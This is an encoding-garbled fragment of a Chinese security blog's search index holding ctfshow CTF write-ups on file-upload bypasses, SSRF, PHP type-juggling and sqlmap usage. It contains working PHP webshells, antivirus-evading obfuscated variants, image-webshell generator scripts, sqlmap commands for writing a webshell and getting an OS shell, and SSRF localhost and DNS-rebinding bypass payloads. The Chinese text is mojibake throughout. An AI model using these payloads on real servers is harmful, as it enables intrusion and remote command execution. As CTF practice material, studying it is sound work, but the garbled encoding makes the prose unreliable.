é™¤æ–‡ä»¶ @unlink($dir.$file); //@unlink æ— æ³•åˆ é™¤æ–‡ä»¶å¤¹ } else { $info = @getimagesize($dir.$file); //è¿”å›å›¾ç‰‡ä¿¡æ¯ if(!$info || $info[2] !=2) { @unlink($dir.$file); } } } } closedir($handle); } $this-&gt;db-&gt;update(array(&#39;avatar&#39;=&gt;1), array(&#39;uid&#39;=&gt;$this-&gt;uid)); exit(&#39;1&#39;); } å› ä¸ºè¿™ä¸ªæ–¹æ³•æ²¡æœ‰è¿›è¡Œé€’å½’æŸ¥è¯¢,readdir()åªèƒ½åˆ—å‡ºè¯¥ç›®å½•ä¸‹çš„æ–‡ä»¶,ä½†æ˜¯åˆ é™¤æ–‡ä»¶å®ƒç”¨çš„æ˜¯@unlink(),@unlink æ— æ³•åˆ é™¤æ–‡ä»¶å¤¹ï¼Œæ‰€ä»¥è¯´è‹¥æˆ‘ä»¬é€šè¿‡æŠ“åŒ…,å°†å‹ç¼©åŒ…å†…å®¹ä¿®æ”¹ä¸ºä¸€ä¸ªkaliæ–‡ä»¶å¤¹,é‡Œé¢å­˜æ”¾1.phpæœ¨é©¬,è¿™ä¸²ä»£ç æ— æ³•åˆ é™¤kaliæ–‡ä»¶,ä¹Ÿæ²¡æœ‰é€’å½’æ£€æµ‹æˆ‘ä»¬çš„1.phpæ–‡ä»¶,å¯¼è‡´æˆ‘ä»¬å°±å¯ä»¥ä½¿æˆ‘ä»¬çš„æ¶æ„æ–‡ä»¶æˆåŠŸä¸Šä¼ ","categories":[{"name":"cms","slug":"cms","permalink":"https://pp1ove.gitee.io/categories/cms/"}],"tags":[{"name":"æ–‡ä»¶ä¸Šä¼ ","slug":"æ–‡ä»¶ä¸Šä¼ ","permalink":"https://pp1ove.gitee.io/tags/æ–‡ä»¶ä¸Šä¼ /"}],"keywords":[{"name":"cms","slug":"cms","permalink":"https://pp1ove.gitee.io/categories/cms/"}]},{"title":"sqlmap","slug":"sqlmap","date":"2021-01-29T11:58:30.000Z","updated":"2021-02-18T10:37:06.493Z","comments":false,"path":"2021/01/29/sqlmap/","link":"","permalink":"https://pp1ove.gitee.io/2021/01/29/sqlmap/","excerpt":"","text":"åŠŸèƒ½ä»‹ç»1.dumpæ•°æ® 2.è¯»å†™æ–‡ä»¶ 3.ç»•webé˜²ç«å¢™ï¼ˆwafï¼‰ 4.SqlMapAPI æ”¯æŒçš„æ³¨å…¥ç±»å‹1ã€åŸºäºå¸ƒå°”çš„ç›²æ³¨ï¼Œå³å¯ä»¥æ ¹æ®è¿”å›é¡µé¢åˆ¤æ–­æ¡ä»¶çœŸå‡çš„æ³¨å…¥ã€‚ 2ã€åŸºäºæ—¶é—´çš„ç›²æ³¨ï¼Œå³ä¸èƒ½æ ¹æ®é¡µé¢è¿”å›å†…å®¹åˆ¤æ–­ä»»ä½•ä¿¡æ¯ï¼Œç”¨æ¡ä»¶è¯­å¥æŸ¥çœ‹æ—¶é—´å»¶è¿Ÿè¯­å¥æ˜¯å¦æ‰§è¡Œï¼ˆå³é¡µé¢è¿”å›æ—¶é—´æ˜¯å¦å¢åŠ ï¼‰æ¥åˆ¤æ–­ã€‚ 3ã€åŸºäºæŠ¥é”™æ³¨å…¥ï¼Œå³é¡µé¢ä¼šè¿”å›é”™è¯¯ä¿¡æ¯ï¼Œæˆ–è€…æŠŠæ³¨å…¥çš„è¯­å¥çš„ç»“æœç›´æ¥è¿”å›åœ¨é¡µé¢ä¸­ã€‚ 4ã€è”åˆæŸ¥è¯¢æ³¨å…¥ï¼Œå¯ä»¥ä½¿ç”¨unionçš„æƒ…å†µä¸‹çš„æ³¨å…¥ã€‚ï¼ˆé€‚åˆç”¨äºé€šè¿‡å¾ªç¯ç›´æ¥è¾“å‡ºè”åˆæŸ¥è¯¢ç»“æœï¼Œå¦åˆ™åªä¼šæ˜¾ç¤ºç¬¬ä¸€é¡¹ç»“æœï¼‰ 5ã€å †æŸ¥è¯¢æ³¨å…¥ï¼Œå¯ä»¥åŒæ—¶æ‰§è¡Œå¤šæ¡è¯­å¥çš„æ‰§è¡Œæ—¶çš„æ³¨å…¥ã€‚ ç›¸å…³å‘½ä»¤-u &quot;&quot; #æµ‹è¯•æ˜¯å¦æœ‰æ³¨å…¥ -u &quot;&quot; --current-db #æŸ¥çœ‹å½“å‰æ•°æ®åº“ -u &quot;&quot; -D dbname --tables #æŸ¥çœ‹æ‰€æœ‰è¡¨ -u &quot;&quot; -D dbname -T tablename --columns #æŸ¥å­—æ®µ -u &quot;&quot; -D dbname -T tablename -C id,name,passwd --dump#æŸ¥æ•°æ® -u &quot;&quot; --cookie=&quot;PHPSESSID=613DAD.....&quot; #ä½¿ç”¨cookie -u &quot;&quot; --file-read=&quot;C:\\phpStudy\\www\\index.php&quot; #è¯»å–é“­æ„Ÿæ–‡ä»¶ï¼Œéœ€è¦ç”¨ç»å¯¹è·¯å¾„ -u &quot;&quot; --file-write=&quot;./shell.php&quot; --file-dest &quot;C:\\phpStudy\\www\\a.php&quot; #å†™webshell -u &quot;&quot; --data &quot;uname=1&amp;passwd&quot; #postæ³¨å…¥ -u &quot;&quot; --os-shell #è·å–shell -u &quot;&quot; --sql-shell --no-cast #è·å–æ•°æ®åº“æƒé™ SqlMapAPI python sqlmapapi.py -s -h -p","categories":[{"name":"å·¥å…·","slug":"å·¥å…·","permalink":"https://pp1ove.gitee.io/categories/å·¥å…·/"}],"tags":[{"name":"sqlmap","slug":"sqlmap","permalink":"https://pp1ove.gitee.io/tags/sqlmap/"}],"keywords":[{"name":"å·¥å…·","slug":"å·¥å…·","permalink":"https://pp1ove.gitee.io/categories/å·¥å…·/"}]},{"title":"ctfshow-æ–‡ä»¶ä¸Šä¼ ","slug":"ctfshow-æ–‡ä»¶ä¸Šä¼ ","date":"2021-01-29T07:02:05.000Z","updated":"2021-02-07T13:50:29.116Z","comments":false,"path":"2021/01/29/ctfshow-æ–‡ä»¶ä¸Šä¼ /","link":"","permalink":"https://pp1ove.gitee.io/2021/01/29/ctfshow-æ–‡ä»¶ä¸Šä¼ /","excerpt":"","text":"151å…³é—­æµè§ˆå™¨js æˆ–è€…æŠ“åŒ…ä¿®æ”¹æˆä¸€å¥è¯ 152ä¸Šä¼  1.phpç„¶åæŠ“åŒ…ä¿®æ”¹content-typeä¸º image/pngæˆ–è€…ä¸Šä¼ .pngæ–‡ä»¶åä¿®æ”¹åç¼€ä¸º.php 153https://www.dazhuanlan.com/2020/03/08/5e641cbc397c2/ å‘ç°å¾ˆå®¹æ˜“ä¸Šä¼ å¦‚php5,phtmlç­‰ç±»å‹æ–‡ä»¶,ä½†æ˜¯ä¸è§£æ.é€šè¿‡æ’ä»¶è¯†åˆ«ä¸ºnginxæœåŠ¡å™¨,å°è¯•ä¸Šä¼ .user.ini,å‘ç°ä¸Šä¼ æˆåŠŸ æ–‡ä»¶å†…å®¹: auto_prepend_file = 1.php 1 ç„¶åä¸Šä¼ ä¸€å¼ å›¾ç‰‡é©¬,1.php å†…å®¹: phpinfo(); @eval($_POST[&#39;hacker&#39;]); 12 ç„¶åè®¿é—® /upload/index.php 154å…ˆä¸Šä¼ .user.ini,å†ä¸Šä¼ å›¾ç‰‡é©¬,å†è®¿é—®/upload/index.php åœ¨å‰é¢ä¸€é¢˜çš„åŸºç¡€ä¸Šå¢åŠ äº†å†…å®¹è¿‡æ»¤,è¿‡æ»¤äº†php , å¯ä»¥ç”¨å¤§å°å†™æ¥ç»•è¿‡ å°è¯•ä½¿ç”¨çŸ­æ ‡ç­¾ç»•è¿‡ å¯¹äºphpçš„æ ‡ç­¾å…¶ä»–å†™æ³•ï¼Œæˆ‘ä»¬è¿™é‡Œå¤šè¯´å‡ ç§ 1ã€ &lt;? echo &#39;123&#39;;?&gt; å‰ææ˜¯å¼€å¯é…ç½®å‚æ•°short_open_tags=on 2ã€ &lt;?=(è¡¨è¾¾å¼)?&gt; ç­‰ä»·äº &lt;?php echo (è¡¨è¾¾å¼)?&gt; ä¸éœ€è¦å¼€å¯å‚æ•°è®¾ç½® 3ã€ &lt;% echo &#39;123&#39;;%&gt; å‰ææ˜¯å¼€å¯é…ç½®å‚æ•°asp_tags=onï¼Œç»è¿‡æµ‹è¯•å‘ç°7.0åŠä»¥ä¸Šä¿®æ”¹å®Œä¹‹åä¹Ÿä¸èƒ½ä½¿ç”¨ï¼Œè€Œæ˜¯æŠ¥500é”™è¯¯ï¼Œä½†æ˜¯7.0ä»¥ä¸‹ç‰ˆæœ¬åœ¨ä¿®æ”¹å®Œé…ç½®åå°±å¯ä»¥ä½¿ç”¨äº†ã€‚ 4ã€ &lt;script language=â€phpâ€&gt;echo &#39;123&#39;; &lt;/script&gt; 1 ä¸éœ€è¦ä¿®æ”¹å‚æ•°å¼€å…³ï¼Œä½†æ˜¯åªèƒ½åœ¨7.0ä»¥ä¸‹å¯ç”¨ã€‚ å¯¹äºè¯¥é¢˜ï¼Œæˆ‘ä»¬å¯ç”¨ä½¿ç”¨&lt;?=(è¡¨è¾¾å¼)?&gt;è¿›è¡Œç»•è¿‡ï¼Œå›¾ç‰‡å†…å®¹ &lt;?=eval($_POST[1]);?&gt; 155 æ–‡ä»¶å†…å®¹è¿‡æ»¤phpæµ‹è¯•æ­£å¸¸çš„ png å›¾ç‰‡å¯ä»¥ä¸Šä¼ ã€‚ å¯¹å›¾ç‰‡å†…å®¹è¿‡æ»¤php å¤§å°å†™ä¸èƒ½ç»•è¿‡äº† ç»•è¿‡ &lt;?=eval($_POST[&#39;a&#39;]); 156è¿‡æ»¤ php, [æµ‹è¯•ï¼Œåˆæ˜¯æ–‡ä»¶å†…å®¹è¿‡æ»¤äº† php. ç´§æ¥ç€å‘ç°äº‹æƒ…æ²¡è¿™ä¹ˆç®€å•ï¼Œè¿˜è¿‡æ»¤äº†[ï¼Œè¿™ç»™ä¼ å‚é€ æˆäº†ä¸€å®šçš„å›°éš¾ã€‚ ä½†æ˜¯æˆ‘ä»¬å¯ä»¥ç›´æ¥ &lt;?=system(&#39;cat ../flag.???&#39;); &lt;?=eval($_POST{&#39;a&#39;}); # ç”¨ {} ä»£æ›¿ [] 157-158è¿‡æ»¤; php [] {}evalç”¨ä¸äº†äº† ç›´æ¥ &lt;?=system(&#39;ls ../&#39;)?&gt; &lt;?=system(&#39;cat ../*&#39;)?&gt; 159 åˆè¿‡æ»¤()æ— æ³•ä½¿ç”¨å‡½æ•°,ä½¿ç”¨ 160 è¿‡æ»¤ åŒ…å«æ—¥å¿—æ–‡ä»¶è¿‡æ»¤äº†æ‹¬å·åå¼•å·è¿˜æœ‰ä¸€äº›å…³é”®å­— åˆ©ç”¨æ—¥å¿—åŒ…å«ç»•è¿‡ï¼Œå›¾ç‰‡å†…å®¹&lt;?=include&quot;/var/lo&quot;.&quot;g/nginx/access.lo&quot;.&quot;g&quot;?&gt;å› ä¸ºlogè¢«è¿‡æ»¤äº†ã€‚æ‰€ä»¥ç”¨æ‹¼æ¥ç»•è¿‡ ä¸Šä¼ å®Œ.user.iniå’Œå›¾ç‰‡å è®¿é—®ç½‘ç«™ç„¶åä¿®æ”¹uaå¤´ä¿¡æ¯ æ¥ç€è®¿é—®/uploadå³å¯æ‹¿åˆ°flag 161åœ¨160çš„åŸºç¡€ä¸Šå¢åŠ å›¾ç‰‡å¤´å³å¯ï¼Œå³ GIF89A 162-163 åŒ…å«sessionæ–‡ä»¶https://www.freebuf.com/vuls/202819.html é¦–å…ˆä¸Šä¼ .user.ini ç„¶åè¿›è¡Œæ¡ä»¶ç«äº‰ å¦å¤–ä¸€è¾¹ä¸€ç›´è®¿é—®upload/index.php 164 äºŒæ¬¡æ¸²æŸ“äºŒæ¬¡æ¸²æŸ“åŸç† : https://www.fujieace.com/penetration-test/upload-labs-pass-16.html PNGå›¾ç‰‡é©¬è„šæœ¬: &lt;?php $p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23, 0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae, 0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc, 0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f, 0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c, 0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d, 0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1, 0x66, 0x44, 0x50, 0x33); $img = imagecreatetruecolor(32, 32); for ($y = 0; $y &lt; sizeof($p); $y += 3) { $r = $p[$y]; $g = $p[$y+1]; $b = $p[$y+2]; $color = imagecolorallocate($img, $r, $g, $b); imagesetpixel($img, round($y / 3), 0, $color); } imagepng($img,&#39;2.png&#39;); //è¦ä¿®æ”¹çš„å›¾ç‰‡çš„è·¯å¾„ /* æœ¨é©¬å†…å®¹ &lt;?$_GET[0]($_POST[1]);?&gt; */ ?&gt; ç„¶åä¼šåœ¨å½“å‰ç›®å½•ä¸‹ç”Ÿæˆä¸€ä¸ªå›¾ç‰‡é©¬ 165 äºŒæ¬¡æ¸²æŸ“ jpg&lt;?php $miniPayload = &quot;&lt;?=phpinfo();?&gt;&quot;; if(!extension_loaded(&#39;gd&#39;) || !function_exists(&#39;imagecreatefromjpeg&#39;)) { die(&#39;php-gd is not installed&#39;); } if(!isset($argv[1])) { die(&#39;php jpg_payload.php &lt;jpg_name.jpg&gt;&#39;); } set_error_handler(&quot;custom_error_handler&quot;); for($pad = 0; $pad &lt; 1024; $pad++) { $nullbytePayloadSize = $pad; $dis = new DataInputStream($argv[1]); $outStream = file_get_contents($argv[1]); $extraBytes = 0; $correctImage = TRUE; if($dis-&gt;readShort() != 0xFFD8) { die(&#39;Incorrect SOI marker&#39;); } while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) { $marker = $dis-&gt;readByte(); $size = $dis-&gt;readShort() - 2; $dis-&gt;skip($size); if($marker === 0xDA) { $startPos = $dis-&gt;seek(); $outStreamTmp = substr($outStream, 0, $startPos) . $miniPayload . str_repeat(&quot;\\0&quot;,$nullbytePayloadSize) . substr($outStream, $startPos); checkImage(&#39;_&#39;.$argv[1], $outStreamTmp, TRUE); if($extraBytes !== 0) { while((!$dis-&gt;eof())) { if($dis-&gt;readByte() === 0xFF) { if($dis-&gt;readByte !== 0x00) { break; } } } $stopPos = $dis-&gt;seek() - 2; $imageStreamSize = $stopPos - $startPos; $outStream = substr($outStream, 0, $startPos) . $miniPayload . substr( str_repeat(&quot;\\0&quot;,$nullbytePayloadSize). substr($outStream, $startPos, $imageStreamSize), 0, $nullbytePayloadSize+$imageStreamSize-$extraBytes) . substr($outStream, $stopPos); } elseif($correctImage) { $outStream = $outStreamTmp; } else { break; } if(checkImage(&#39;payload_&#39;.$argv[1], $outStream)) { die(&#39;Success!&#39;); } else { break; } } } } unlink(&#39;payload_&#39;.$argv[1]); die(&#39;Something\\&#39;s wrong&#39;); function checkImage($filename, $data, $unlink = FALSE) { global $correctImage; file_put_contents($filename, $data); $correctImage = TRUE; imagecreatefromjpeg($filename); if($unlink) unlink($filename); return $correctImage; } function custom_error_handler($errno, $errstr, $errfile, $errline) { global $extraBytes, $correctImage; $correctImage = FALSE; if(preg_match(&#39;/(\\d+) extraneous bytes before marker/&#39;, $errstr, $m)) { if(isset($m[1])) { $extraBytes = (int)$m[1]; } } } class DataInputStream { private $binData; private $order; private $size; public function __construct($filename, $order = false, $fromString = false) { $this-&gt;binData = &#39;&#39;; $this-&gt;order = $order; if(!$fromString) { if(!file_exists($filename) || !is_file($filename)) die(&#39;File not exists [&#39;.$filename.&#39;]&#39;); $this-&gt;binData = file_get_contents($filename); } else { $this-&gt;binData = $filename; } $this-&gt;size = strlen($this-&gt;binData); } public function seek() { return ($this-&gt;size - strlen($this-&gt;binData)); } public function skip($skip) { $this-&gt;binData = substr($this-&gt;binData, $skip); } public function readByte() { if($this-&gt;eof()) { die(&#39;End Of File&#39;); } $byte = substr($this-&gt;binData, 0, 1); $this-&gt;binData = substr($this-&gt;binData, 1); return ord($byte); } public function readShort() { if(strlen($this-&gt;binData) &lt; 2) { die(&#39;End Of File&#39;); } $short = substr($this-&gt;binData, 0, 2); $this-&gt;binData = substr($this-&gt;binData, 2); if($this-&gt;order) { $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]); } else { $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]); } return $short; } public function eof() { return !$this-&gt;binData||(strlen($this-&gt;binData) === 0); } } ?&gt; 1ã€éšä¾¿æ‰¾ä¸€ä¸ªjpgå›¾ç‰‡ï¼Œå…ˆä¸Šä¼ è‡³æœåŠ¡å™¨ç„¶åå†ä¸‹è½½åˆ°æœ¬åœ°ä¿å­˜ä¸º 1.jpg ï¼› 2ã€æ’å…¥phpä»£ç ï¼›ä½¿ç”¨è„šæœ¬å¤„ç†1.jpgï¼Œå‘½ä»¤ï¼š php jpg_payload.php 1.jpg ä½¿ç”¨16è¿›åˆ¶ç¼–è¾‘å™¨æ‰“å¼€ï¼Œå°±å¯ä»¥çœ‹åˆ°æ’å…¥çš„phpä»£ç ï¼› 3ã€ä¸Šä¼ å›¾ç‰‡é©¬ï¼›å°†ç”Ÿæˆçš„ payload_1.jpgä¸Šä¼ ã€‚ 4ã€éªŒè¯ï¼›å°†ä¸Šä¼ çš„å›¾ç‰‡å†æ¬¡ä¸‹è½½åˆ°æœ¬åœ°ï¼Œä½¿ç”¨16è¿›åˆ¶ç¼–è¾‘å™¨æ‰“å¼€ã€‚ å¯ä»¥çœ‹åˆ°ï¼Œphpä»£ç æ²¡æœ‰è¢«å»é™¤ï¼Œè¯æ˜æˆ‘ä»¬æˆåŠŸä¸Šä¼ äº†å«æœ‰phpä»£ç çš„jpgå›¾ç‰‡ã€‚ æ³¨æ„ï¼šæœ‰ä¸€äº›jpgå›¾ç‰‡ä¸èƒ½è¢«å¤„ç†ï¼Œæ‰€ä»¥è¦å¤šå°è¯•ä¸€äº›jpgå›¾ç‰‡ã€‚ 166å‰ç«¯éªŒè¯åªèƒ½ä¸Šä¼ ZIPæ–‡ä»¶,ç„¶åéšä¾¿ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶,å‘ç°ç‚¹å‡»ä¸‹è½½æ–‡ä»¶åä¼šåŒ…å«æ–‡ä»¶ ä¸Šä¼ ä¸€å¥è¯ 167 .htaccessæŠ“åŒ…æµ‹è¯•äº†ä¸€ä¸‹ï¼Œæ˜¯é»‘åå•ã€‚ å¼€å±€æœ‰ä¸ªæç¤ºhttpd æµ‹è¯•apacheè§£ææ¼æ´æ²¡è§£æã€‚ apache è§£ææ¼æ´ï¼šhttps://blog.csdn.net/qq_32434307/article/details/79480316 æµ‹è¯•.htaccessæˆåŠŸã€‚ &lt;FilesMatch &quot;1.jpg&quot;&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt; ç„¶åä¸Šä¼ å¸¦æœ‰é©¬çš„ 1.jpgå³å¯ã€‚ 168-170å…æ€ &lt;?php $a = &quot;s#y#s#t#e#m&quot;; $b = explode(&quot;#&quot;,$a); $c = $b[0].$b[1].$b[2].$b[3].$b[4].$b[5]; $c($_REQUEST[1]); ?&gt; &lt;?php $a=substr(&#39;1s&#39;,1).&#39;ystem&#39;; $a($_REQUEST[1]); ?&gt; &lt;?php $a=strrev(&#39;metsys&#39;); $a($_REQUEST[1]); ?&gt; &lt;?php $a=$_REQUEST[&#39;a&#39;]; $b=$_REQUEST[&#39;b&#39;]; $a($b); ?&gt; 169æµ‹è¯•å‘ç° æŠ“åŒ…éœ€ä¿®æ”¹Content-Type: image/png æ–‡ä»¶ååç¼€éšæ„ã€‚ çœ‹çœ‹æ–‡ä»¶å†…å®¹è¿‡æ»¤äº†å•¥ &lt;&gt; ? ç­‰ç­‰ã€‚ åªèƒ½è¿›è¡Œ .user.iniæ—¥å¿—æ–‡ä»¶åŒ…å«äº†ã€‚ æ€è·¯: ä¸Šä¼  .user.ini auto_prepend_file=/var/log/nginx/access.log ç„¶åéšä¾¿ä¸Šä¼ ä¸ªphpæ–‡ä»¶å³å¯ã€‚ ç„¶åæ”¹UAä¸ºä¸€å¥è¯å³å¯ã€‚ 170æµ‹è¯•ä¸Šä¼ zipï¼ŒæŠ“åŒ…ä¿®æ”¹ï¼Œåç¼€ä¸ºphp, MIMEç±»å‹ä¸ºimage/png. åŒ…å«.user.ini æ—¥å¿—æ–‡ä»¶/var/log/nginx/access.log","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://pp1ove.gitee.io/categories/æŠ€æœ¯/"}],"tags":[{"name":"æ–‡ä»¶ä¸Šä¼ ","slug":"æ–‡ä»¶ä¸Šä¼ ","permalink":"https://pp1ove.gitee.io/tags/æ–‡ä»¶ä¸Šä¼ /"}],"keywords":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://pp1ove.gitee.io/categories/æŠ€æœ¯/"}]},{"title":"ctfshow-ssrf","slug":"ctfshow-ssrf","date":"2021-01-28T12:39:17.000Z","updated":"2021-01-29T06:54:48.818Z","comments":false,"path":"2021/01/28/ctfshow-ssrf/","link":"","permalink":"https://pp1ove.gitee.io/2021/01/28/ctfshow-ssrf/","excerpt":"","text":"351&lt;?php error_reporting(0); highlight_file(__FILE__); $url=$_POST[&#39;url&#39;]; $ch=curl_init($url); curl_setopt($ch, CURLOPT_HEADER, 0); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $result=curl_exec($ch); curl_close($ch); echo ($result); ? 352-353&lt;?php error_reporting(0); highlight_file(__FILE__); $url=$_POST[&#39;url&#39;]; $x=parse_url($url); if($x[&#39;scheme&#39;]===&#39;http&#39;||$x[&#39;scheme&#39;]===&#39;https&#39;){ if(!preg_match(&#39;/localhost|127.0.0/&#39;)){ $ch=curl_init($url); curl_setopt($ch, CURLOPT_HEADER, 0); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $result=curl_exec($ch); curl_close($ch); echo ($result); } else{ die(&#39;hacker&#39;); } } else{ die(&#39;hacker&#39;); } ?&gt; è¦æ±‚å¿…é¡»æ˜¯httpæˆ–https ç„¶åè¿‡æ»¤127.0.0.1/localhost æœ‰å¾ˆå¤šæ–¹æ³• http://2130706433/flag.php åè¿›åˆ¶ç»•è¿‡ http://0x7F000001/flag.php http://017700000001/flag.php http://0/flag.php http://127.0.1/flag.php http://127.1/flag.php http://1il88.cn/r6NOs çŸ­ç½‘å€ï¼Œæ²¡æœ‰æˆåŠŸ http://127.0ã€‚0ã€‚1/flag.php æ²¡æœ‰æˆåŠŸ http://127.0.0.â‘  å°é—­å¼å­—ç¬¦,æ²¡æœ‰æˆåŠŸ 354æ¬è¿ä¸€ä¸‹ DNS-Rebindingæ”»å‡»ç»•è¿‡ url=http://r.xxxzc8.ceye.io/flag.php è‡ªå·±å»ceye.ioæ³¨å†Œç»‘å®š127.0.0.1ç„¶åè®°å¾—å‰é¢åŠ r 302è·³è½¬ç»•è¿‡ä¹Ÿè¡Œï¼Œåœ¨è‡ªå·±çš„ç½‘ç«™ä¸»é¡µåŠ ä¸Šè¿™ä¸ª &lt;?php header(&quot;Location:http://127.0.0.1/flag.php&quot;); æˆ‘è‡ªå·±çš„åŸŸåAè®°å½•è®¾ä¸ºäº†127.0.0.1 æˆ–è€…æœ‰ä¸ªç°æˆçš„Aè®°å½•æ˜¯127.0.0.1çš„ç½‘ç«™ url=http://sudo.cc/flag.php 355-356å¯¹hosté•¿åº¦è¿›è¡Œäº†é™åˆ¶ï¼Œhosté•¿åº¦å°äº5 http://0/flag.php 357å…³é”®ä»£ç ï¼Œä¸èƒ½æ˜¯ä¸€äº›ç§æœ‰åœ°å€ if(!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) { die(&#39;ip!&#39;); } FILTER_FLAG_IPV4 - è¦æ±‚å€¼æ˜¯åˆæ³•çš„ IPv4 IPï¼ˆæ¯”å¦‚ 255.255.255.255ï¼‰ FILTER_FLAG_IPV6 - è¦æ±‚å€¼æ˜¯åˆæ³•çš„ IPv6 IPï¼ˆæ¯”å¦‚ 2001:0db8:85a3:08d3:1319:8a2e:0370:7334ï¼‰ FILTER_FLAG_NO_PRIV_RANGE - è¦æ±‚å€¼æ˜¯ RFC æŒ‡å®šçš„ç§åŸŸ IP ï¼ˆæ¯”å¦‚ 192.168.0.1ï¼‰ FILTER_FLAG_NO_RES_RANGE - è¦æ±‚å€¼ä¸åœ¨ä¿ç•™çš„ IP èŒƒå›´å†…ã€‚è¯¥æ ‡å¿—æ¥å— IPV4 å’Œ IPV6 å€¼ã€‚ ç”¨web354è¯´è¿‡çš„DNS-Rebindingä¸302è·³è½¬å³å¯è§£é¢˜ 358é™åˆ¶æ˜¯è¿™ä¸ª if(preg_match(&#39;/^http:\\/\\/ctf\\..*show$/i&#39;,$url)){ echo file_get_contents($url); } blackhatè®®é¢˜åŠ ä¸Šurlè§£æç‰¹æ€§phpçš„curlé»˜è®¤æ˜¯@åé¢çš„éƒ¨åˆ†åŠ ä¸Š?urlè§£æçš„æ—¶å€™ä¼šæŠŠä»–å½“æˆurlè§£æçš„getè¯·æ±‚å‚æ•° url=http://ctf.@127.0.0.1/flag.php?.show 359-360æºç é‡Œé¢æœ‰è¿™æ ·ä¸€æ®µå†…å®¹ ç”¨gopheråè®®æ‰“mysql ä½¿ç”¨gopherusç”Ÿæˆpayload å°†_åé¢çš„å†æ¬¡urlç¼–ç ,ä¼ å…¥check.phpé‡Œé¢ 360æ‰“redis,ä¸å¤šè¯´,å·®ä¸å¤šçš„æ­¥éª¤","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://pp1ove.gitee.io/categories/æŠ€æœ¯/"}],"tags":[{"name":"ssrf","slug":"ssrf","permalink":"https://pp1ove.gitee.io/tags/ssrf/"}],"keywords":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://pp1ove.gitee.io/categories/æŠ€æœ¯/"}]},{"title":"ctfshow-phpç‰¹æ€§","slug":"ctfshow-phpç‰¹æ€§","date":"2021-01-28T03:24:57.000Z","updated":"2021-03-06T13:51:46.168Z","comments":false,"path":"2021/01/28/ctfshow-phpç‰¹æ€§/","link":"","permalink":"https://pp1ove.gitee.io/2021/01/28/ctfshow-phpç‰¹æ€§/","excerpt":"","text":"å‚è€ƒé“¾æ¥ï¼šhttps://www.freebuf.com/articles/web/261802.html 89 æ•°ç»„ç»•è¿‡intvalinclude(&quot;flag.php&quot;); highlight_file(__FILE__); if(isset($_GET[&#39;num&#39;])){ $num = $_GET[&#39;num&#39;]; if(c(&quot;/[0-9]/&quot;, $num)){ die(&quot;no no no!&quot;); } if(intval($num)){ echo $flag; } } åˆ©ç”¨æ•°ç»„ç»•è¿‡ payload:num[]=1 90 intval($num,0)include(&quot;flag.php&quot;); highlight_file(__FILE__); if(isset($_GET[&#39;num&#39;])){ $num = $_GET[&#39;num&#39;]; if($num===&quot;4476&quot;){ die(&quot;no no no!&quot;); } if(intval($num,0)===4476){ echo $flag; }else{ echo intval($num,0); } } ä½¿ç”¨16è¿›åˆ¶ç»•è¿‡ 91 /må¤šè¡ŒåŒ¹é…show_source(__FILE__); include(&#39;flag.php&#39;); $a=$_GET[&#39;cmd&#39;]; if(preg_match(&#39;/^php$/im&#39;, $a)){ if(preg_match(&#39;/^php$/i&#39;, $a)){ echo &#39;hacker&#39;; } else{ echo $flag; } } else{ echo &#39;nonononono&#39;; } è¿™é‡Œè€ƒäº†ä¸€ä¸ª /må¤šè¡ŒåŒ¹é… æ‰€ä»¥ç¬¬ä¸€ä¸ªifå…¶å®æ˜¯ä»»æ„ä¸€è¡Œæ»¡è¶³å°±è¡Œ,è€Œç¬¬äºŒä¸ªifåªèƒ½åŒ¹é…ç¬¬ä¸€è¡Œ payloadï¼š?cmd=%0Aphp 92 intval($num,0) include(&quot;flag.php&quot;); highlight_file(__FILE__); if(isset($_GET[&#39;num&#39;])){ $num = $_GET[&#39;num&#39;]; if($num==4476){ die(&quot;no no no!&quot;); } if(intval($num,0)==4476){ echo $flag; }else{ echo intval($num,0); } } 16è¿›åˆ¶ç»•è¿‡ 93include(&quot;flag.php&quot;); highlight_file(__FILE__); if(isset($_GET[&#39;num&#39;])){ $num = $_GET[&#39;num&#39;]; if($num==4476){ die(&quot;no no no!&quot;); } if(preg_match(&quot;/[a-z]/i&quot;, $num)){ die(&quot;no no no!&quot;); } if(intval($num,0)==4476){ echo $flag; }else{ echo intval($num,0); } } å…«è¿›åˆ¶ç»•è¿‡ 94 strposinclude(&quot;flag.php&quot;); highlight_file(__FILE__); if(isset($_GET[&#39;num&#39;])){ $num = $_GET[&#39;num&#39;]; if($num===&quot;4476&quot;){ die(&quot;no no no!&quot;); } if(preg_match(&quot;/[a-z]/i&quot;, $num)){ die(&quot;no no no!&quot;); } if(!strpos($num, &quot;0&quot;)){ die(&quot;no no no!&quot;); } if(intval($num,0)===4476){ echo $flag; } } å¯¹äºstrpos()å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨æ¢è¡Œè¿›è¡Œç»•è¿‡ï¼ˆ%0aï¼‰ payload:?num=%0a010574 ä¹Ÿå¯ä»¥å°æ•°ç‚¹ç»•è¿‡ payloadï¼š?num=4476.0 å› ä¸ºintval()å‡½æ•°åªè¯»å–æ•´æ•°éƒ¨åˆ† è¿˜å¯ä»¥å…«è¿›åˆ¶ç»•è¿‡(%20æ˜¯ç©ºæ ¼çš„urlç¼–ç å½¢å¼) payloadï¼š?num=%20010574 